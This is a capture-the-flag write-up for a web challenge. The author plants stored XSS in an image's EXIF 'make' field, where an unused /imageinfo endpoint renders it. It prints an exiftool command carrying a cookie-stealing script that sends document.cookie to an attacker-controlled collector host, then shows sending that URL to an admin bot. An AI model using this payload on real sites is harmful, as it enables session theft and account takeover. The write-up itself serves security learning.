Challenge Description:
Look at this nice new Social Media application. You can only view your own profile, 
since it is still in the very early development phase, but it is the up and coming social networking platform.
P.S. If you see something strange, let developers know!

Challenge URL:
https://imgr.pwn.institute/

Steps to solve:
You're presented with a simple social media application.
You can register your account, change your profile picture and submit a url to developers.
URL must point to https://imgr.pwn.institute/

My first idea was to upload some kind of webshell as profile image but that approach failed.
Filename gets hashed without extension.

Once you're logged in in the app there is a html comment in the page source:
<!-- todo: remove unused /imageinfo endpoint -->

Imageinfo endpoint is showing exif data of an uploaded profile image.
First idea was to test if for xss.


I've created an image with xxs payload as "make".
I've used exiftool:
exiftool -make "<script>alert('xss')</script>" image.jpg

Uploaded the image.jpg, opened it via https://imgr.pwn.institute/imageinfo/{image_hash} and
bam javascript is executed.

My next idea was to create cookie grabbing xss payload,
save it as exif make and send it to developers via report endpoint.
The idea was to steal admin's cookie:

exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg

I've uploaded imagefinal.jpg grabbed it's hashed value,
went to https://imgr.pwn.institute/report and sent the evil URL to developers:
https://imgr.pwn.institute/imageinfo/{imagefinal_hash}

Instead of admin's cookie on my burpcollaborator I've received a connection that contains challenge flag.
